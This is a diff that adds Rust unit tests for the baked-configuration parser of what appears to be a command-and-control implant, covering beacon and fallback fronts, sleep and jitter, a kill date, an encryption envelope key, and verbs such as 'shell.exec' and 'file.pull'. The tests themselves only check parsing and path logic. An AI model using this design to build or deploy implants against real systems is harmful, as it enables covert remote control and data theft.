@@ -247,3 +247,158 @@ pub fn parse_iso_to_unix(text: &str) -> Option<i64> {
     let days = era * 146_097 + day_of_era - 719_468;
     Some(days * 86_400 + hour * 3_600 + minute * 60 + second)
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn bake(json: &str) -> String {
+        use base64::Engine;
+        base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(json)
+    }
+
+    fn minimal() -> Profile {
+        Profile {
+            enroll_url: "https://front.example".into(),
+            beacon_url: String::new(),
+            fallback_enroll_urls: Vec::new(),
+            ca_pem: String::new(),
+            kill_date: None,
+            sleep_seconds: 30.0,
+            jitter_seconds: 10.0,
+            mode: "poll".into(),
+            enroll_path: "/implants/enroll".into(),
+            request_timeout_seconds: 30.0,
+            envelope: "aesgcm".into(),
+            contact_envelope: "none".into(),
+            envelope_key: String::new(),
+            token: String::new(),
+            verbs: Vec::new(),
+        }
+    }
+
+    #[test]
+    fn the_full_bake_reads_every_contract_key() {
+        let baked = bake(
+            r#"{"enrollURL":"https://front.example/old","beaconURL":"https://beacon.example/contact","fallbackEnrollURLs":["https://two.example"],"caCert":"PEM","killDate":"2099-01-01T00:00:00Z","sleep":"45s","jitter":"5s","mode":"stream","enrollPath":"/x","requestTimeout":"15s","envelope":"aesgcm","contactEnvelope":"aesgcm","envelopeKey":"AA","token":"t","verbs":"shell.exec,file.pull"}"#,
+        );
+        let profile = Profile::from_baked(&baked).expect("the bake parses");
+        assert_eq!(profile.enroll_url, "https://front.example/old");
+        // The contact front keeps scheme and authority only: the route is
+        // the server's, not the bake's.
+        assert_eq!(profile.beacon_url, "https://beacon.example");
+        assert_eq!(
+            profile.fallback_enroll_urls,
+            vec!["https://two.example".to_string()]
+        );
+        assert_eq!(profile.sleep_seconds, 45.0);
+        assert_eq!(profile.jitter_seconds, 5.0);
+        assert_eq!(profile.request_timeout_seconds, 15.0);
+        assert_eq!(profile.mode, "stream");
+        assert_eq!(profile.enroll_path, "/x");
+        assert_eq!(profile.contact_envelope, "aesgcm");
+        assert_eq!(
+            profile.verbs,
+            vec!["shell.exec".to_string(), "file.pull".to_string()]
+        );
+        assert_eq!(profile.token, "t");
+        assert_eq!(profile.kill_date.as_deref(), Some("2099-01-01T00:00:00Z"));
+    }
+
+    #[test]
+    fn a_headless_bake_falls_to_the_documented_defaults() {
+        let baked = bake(r#"{"enrollURL":"https://front.example"}"#);
+        let profile = Profile::from_baked(&baked).expect("the minimum bake parses");
+        assert_eq!(profile.sleep_seconds, 30.0);
+        assert_eq!(profile.jitter_seconds, 10.0);
+        assert_eq!(profile.mode, "poll");
+        assert_eq!(profile.enroll_path, "/implants/enroll");
+        assert_eq!(profile.request_timeout_seconds, 30.0);
+        assert_eq!(profile.contact_envelope, "none");
+        assert_eq!(profile.kill_date, None);
+        assert_eq!(profile.beacon_url, "");
+        assert!(profile.fallback_enroll_urls.is_empty());
+    }
+
+    #[test]
+    fn a_bake_without_an_enroll_front_is_refused() {
+        // A fielded artifact whose bake will not parse must not fall back
+        // to stale environment guesses.
+        assert!(Profile::from_baked("").is_none());
+        assert!(Profile::from_baked("!!!").is_none());
+        let headless = bake(r#"{"sleep":"30s"}"#);
+        assert!(Profile::from_baked(&headless).is_none());
+    }
+
+    #[test]
+    fn the_enroll_walk_applies_the_path_across_fronts() {
+        let mut profile = minimal();
+        profile.enroll_path = "/x".into();
+        profile.fallback_enroll_urls =
+            vec!["tcp://10.0.0.1:8443".into(), "https://two.example".into()];
+        assert_eq!(
+            profile.enroll_walk(),
+            vec![
+                "https://front.example/x".to_string(),
+                "tcp://10.0.0.1:8443".to_string(),
+                "https://two.example/x".to_string(),
+            ]
+        );
+    }
+
+    #[test]
+    fn the_path_rule_shapes_only_web_fronts() {
+        assert_eq!(
+            apply_path("https://host.example/old/route", "/x"),
+            "https://host.example/x"
+        );
+        assert_eq!(
+            apply_path("https://host.example", "/x"),
+            "https://host.example/x"
+        );
+        // The non-web families carry dial data in the path.
+        assert_eq!(
+            apply_path("dns://resolver.example/zone.example", "/x"),
+            "dns://resolver.example/zone.example"
+        );
+        assert_eq!(apply_path("tcp://host:443", "/x"), "tcp://host:443");
+        assert_eq!(apply_path("bare-host", "/x"), "bare-host");
+    }
+
+    #[test]
+    fn durations_read_go_style_tokens_and_bare_seconds() {
+        assert_eq!(parse_duration("30s"), 30.0);
+        assert_eq!(parse_duration("5m"), 300.0);
+        assert_eq!(parse_duration("1m30s"), 90.0);
+        assert_eq!(parse_duration("2h"), 7200.0);
+        assert_eq!(parse_duration("1.5s"), 1.5);
+        assert_eq!(parse_duration("45"), 45.0);
+    }
+
+    #[test]
+    fn iso_stamps_parse_past_the_second() {
+        assert_eq!(parse_iso_to_unix("1970-01-01T00:00:00Z"), Some(0));
+        assert_eq!(parse_iso_to_unix("1970-01-02T00:00:00Z"), Some(86_400));
+        // The leap day counts: Feb 29 and Mar 1 of a leap year are one day
+        // apart, not two.
+        let leap = parse_iso_to_unix("2024-02-29T00:00:00Z").expect("leap day parses");
+        let march = parse_iso_to_unix("2024-03-01T00:00:00Z").expect("march parses");
+        assert_eq!(march - leap, 86_400);
+        // Fractional seconds and offsets ride past the compared prefix.
+        assert_eq!(
+            parse_iso_to_unix("2024-03-01T00:00:00.500Z"),
+            parse_iso_to_unix("2024-03-01T00:00:00+01:00")
+        );
+        assert_eq!(parse_iso_to_unix("short"), None);
+    }
+
+    #[test]
+    fn the_kill_date_fires_only_past_the_second() {
+        let mut profile = minimal();
+        assert!(!profile.kill_date_passed());
+        profile.kill_date = Some("2020-01-01T00:00:00Z".into());
+        assert!(profile.kill_date_passed());
+        profile.kill_date = Some("2099-01-01T00:00:00Z".into());
+        assert!(!profile.kill_date_passed());
+    }
+}
